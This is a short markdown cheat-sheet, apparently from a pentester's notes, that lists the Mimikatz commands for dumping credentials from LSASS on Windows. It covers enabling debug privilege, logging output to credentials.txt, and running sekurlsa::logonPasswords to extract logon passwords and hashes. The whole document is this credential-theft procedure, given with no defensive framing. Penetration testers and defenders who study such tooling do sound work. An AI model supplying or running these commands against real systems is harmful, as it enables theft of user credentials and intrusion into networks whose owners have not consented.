# Mimikatz

## Recovering LSASS
```
Open an Administrative prompt
mimikatz # privilege::debug and make sure we get '20' ok
mimikatz # log credentials.txt
mimikatz # sekurlsa::logonPasswords
```